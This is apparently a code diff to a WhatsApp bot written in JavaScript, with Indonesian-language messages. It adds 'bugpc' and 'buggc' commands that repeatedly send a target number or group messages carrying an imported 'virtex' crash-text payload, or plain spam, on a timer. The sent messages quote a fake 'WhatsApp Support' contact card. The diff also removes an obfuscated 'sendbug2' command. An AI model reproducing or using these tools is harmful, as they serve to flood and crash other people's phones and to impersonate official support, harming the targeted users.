@@ -13,7 +13,7 @@ const hx = require("hxz-api")
 const dbot = require('dbot-api');
 const xfar = require('xfarr-api');
 const hxz = require("hxz-api")
-const ms = require('ms')
+const toMs = require('ms')
 const yts = require("yt-search");
 const fetch = require('node-fetch')
 const ytdl = require('ytdl-core');
@@ -64,7 +64,7 @@ const {TelegraPh} = require('./lib/uploader')
 const { tiktokDownloader, instaDownloader, zippyDownloader, mediafireDownloader } = require('./lib/downloader')
 const { h2k, FileSize, smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, pickRandom, short } = require('./lib/myfunc')
 const { Nothing,Failed,Succes,addAutoClear,autoClearChat,checkAutoClear, checkDataName, createDataId, getDataId, addDataId, removeDataId, checkDataId, checkClaim, getClaim, expiredClaim, addUserClaim, getHit, cmdAdd, expiredCmd } = require("./lib/db");
-
+const { virtex } = require('./lib/virtex.js')
 
 //=======================[ SETTINGS ]=======================//
 Qoted = `${global.qoted}`
@@ -370,6 +370,18 @@ message: {
 }
 }
 }
+
+//bug kontak
+const lep = { 
+key: {
+fromMe: false, 
+participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
+},
+"message": {
+"contactMessage": {
+"displayName": "WhatsApp Support",
+"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:Support;WhatsApp;;;\nFN:WhatsApp Support\nORG:WhatsApp Support\nTITLE:\nitem1.TEL;waid=6287721317870:+62 877-2131-7870\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-NAME:WhatsApp Support\nEND:VCARD"
+}}}
 
 
 const fvideo = { 
@@ -3635,13 +3647,53 @@ case 'makasih': case 'thanks':
 reply (`*sama - sama kak ${pushname}*`)
 break
 
-case 'sendbug2': case 'todd' : {
-if (!isOwner) return
-let connecting = aqua
-function _0x1a02(){var _0x9511fa=['sendMessage','quoted','1246790oINqcJ','2yEapSB',' ','2382268ivygFy','key','replace','chat','27oEkRwD','2199110ufwRsE','@s.whatsapp.net','6rIhLFT','mentionedJid','154832trKriz','1312287KZVhaq','100117IRrQXd','3554016vHMCCV'];_0x1a02=function(){return _0x9511fa;};return _0x1a02();}var _0x513741=_0x2c43;function _0x2c43(_0x50ccd7,_0x5a8a17){var _0x1a0292=_0x1a02();return _0x2c43=function(_0x2c43dc,_0x4ba15e){_0x2c43dc=_0x2c43dc-0x1a9;var _0x3d4510=_0x1a0292[_0x2c43dc];return _0x3d4510;},_0x2c43(_0x50ccd7,_0x5a8a17);}(function(_0x3c1583,_0x4a5a47){var _0x5568b0=_0x2c43,_0x59e990=_0x3c1583();while(!![]){try{var _0x1d994b=parseInt(_0x5568b0(0x1ac))/0x1*(-parseInt(_0x5568b0(0x1b1))/0x2)+-parseInt(_0x5568b0(0x1ab))/0x3+-parseInt(_0x5568b0(0x1aa))/0x4+-parseInt(_0x5568b0(0x1b0))/0x5*(-parseInt(_0x5568b0(0x1ba))/0x6)+parseInt(_0x5568b0(0x1b3))/0x7+-parseInt(_0x5568b0(0x1ad))/0x8+-parseInt(_0x5568b0(0x1b7))/0x9*(-parseInt(_0x5568b0(0x1b8))/0xa);if(_0x1d994b===_0x4a5a47)break;else _0x59e990['push'](_0x59e990['shift']());}catch(_0x52a42e){_0x59e990['push'](_0x59e990['shift']());}}}(_0x1a02,0x37e2d),Pe=m['mentionedJid'][0x0]?m[_0x513741(0x1a9)][0x0]:m[_0x513741(0x1af)]?m[_0x513741(0x1af)]['sender']:text[_0x513741(0x1b5)](/[^0-9]/g,'')+_0x513741(0x1b9),a=await connecting['sendMessage'](m[_0x513741(0x1b6)],{'react':{'text':'\x20️','key':{'remoteJid':m[_0x513741(0x1b6)],'fromMe':!![],'id':m[_0x513741(0x1b4)]['id']}}}),connecting[_0x513741(0x1ae)](Pe,{'text':_0x513741(0x1b2)},{'quoted':a}));
+case 'bugpc': {
+if (!isOwner) return reply ('khsus owner')
+if (args.length < 1) return reply(`*Syntax Error!*\n\nUse : ${command} number|amount spam|timer\nExample : ${command} 62888|1|10s\n\n\ns = Second/Detik`)
+num = q.split('|')[0]+'@s.whatsapp.net'
+jumlah = q.split('|')[1]
+waktu = q.split('|')[2]
+for (let i = 0; i < jumlah; i++) {
+var messa = await prepareWAMessageMedia({ image: thumbnya }, { upload: aqua.waUploadToServer })
+var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
+"productMessage": {
+"product": {
+"productImage": messa.imageMessage,
+"productId": "7091718154232528",
+"title": `Tes Doank`,
+"description": `${virtex}`,
+"currencyCode": "IDR",
+"priceAmount1000": "100000000000000000",
+"productImageCount": 1,
+"firstImageId": 1,
+"salePriceAmount1000": "1000",
+"retailerId": `Nomor Owner Di Atas`,
+"url": `https://wa.me/6287705048235`
+},
+"businessOwnerJid": "6287705048235@s.whatsapp.net",
+}
+}), { userJid: m.chat, quoted: lep  })
+aqua.relayMessage(num, catalog.message, { messageId: catalog.key.id })
+await sleep(toMs(waktu))
+}
+reply(`Sukses`)
 }
 break
 
+case 'buggc': {
+if (!isOwner) return reply ('khsus owner')
+if (args.length < 1) return reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
+num = q.split('|')[0]
+jumlah = q.split('|')[1]
+waktu = q.split('|')[2]
+for (let i = 0; i < jumlah; i++) {
+aqua.sendMessage(num, { text: 'Oii kimoyasaaa' }, { quoted: lep})
+await sleep(toMs(waktu))
+}
+tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}\nTimer: ${waktu}`
+reply(tekteka)
+}
+break
 
 case 'developer':
 let developer = [
